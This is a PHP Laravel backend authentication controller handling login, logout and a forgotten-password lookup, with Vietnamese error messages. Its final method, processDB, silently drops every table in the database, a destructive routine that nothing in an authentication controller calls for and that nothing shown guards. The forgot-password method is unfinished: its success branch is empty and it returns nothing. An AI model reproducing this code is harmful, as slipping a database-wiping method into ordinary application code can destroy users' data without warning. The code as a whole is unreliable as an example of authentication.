<?php

namespace App\Http\Controllers\Backend;

use App\Repositories\User\UserRepositoryInterface;
use Illuminate\Http\Request;

use App\Http\Requests;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Auth;

class AuthController extends Controller
{

    public  function __construct(UserRepositoryInterface $user)
    {
        $this->user = $user;

    }

    public function  login()
    {
        return view('backend.login');
    }

    public function  processLogin(Requests\LoginRequest $request)
    {
        $dataRequest = $request->except(['_token']);
        if (Auth::attempt($dataRequest,true)) {
            return redirect()->route('home.index');
        }
        else{
            return redirect()->back()->withErrors("Số điện thoại hoặc mật khẩu không đúng")->withInput($request->all());
        }
    }

    public function  logout()
    {
        Auth::logout();
        return redirect()->route('auth.login');
    }

    public function processForgetPassword(Request $request)
    {
        $email = $request->get('email');
        $response=[];
        $checkExistEmail = $this->user->findAbtribute('email', $email);
        if($checkExistEmail) {

        } else {
            $response['status']=0;
            $response['message']="Email không có trong hệ thống !";
        }
    }

    public function  processDB()
    {
        foreach(\DB::select('SHOW TABLES') as $table) {
            $table_array = get_object_vars($table);
            \Schema::drop($table_array[key($table_array)]);
        }
    }
}
